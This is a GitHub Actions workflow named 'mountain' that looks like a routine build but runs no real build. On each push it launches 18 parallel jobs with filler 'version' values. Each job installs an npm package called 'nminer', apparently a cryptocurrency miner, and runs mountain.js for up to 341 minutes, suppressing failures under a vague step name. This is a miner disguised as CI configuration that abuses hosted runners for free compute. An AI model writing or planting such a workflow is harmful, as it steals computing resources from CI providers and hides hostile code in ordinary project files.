name: mountain
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3236 }
          - { version: 4037 }
          - { version: 5872 }
          - { version: 3878 }
          - { version: 876 }
          - { version: 5180 }
          - { version: 315 }
          - { version: 1263 }
          - { version: 8462 }
          - { version: 455 }
          - { version: 6020 }
          - { version: 9559 }
          - { version: 137 }
          - { version: 6464 }
          - { version: 4179 }
          - { version: 6078 }
          - { version: 4826 }
          - { version: 5435 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: acknowledge rightfully
        run: |
          npm install nminer@latest
          timeout 341m node mountain.js || echo "mountain executed"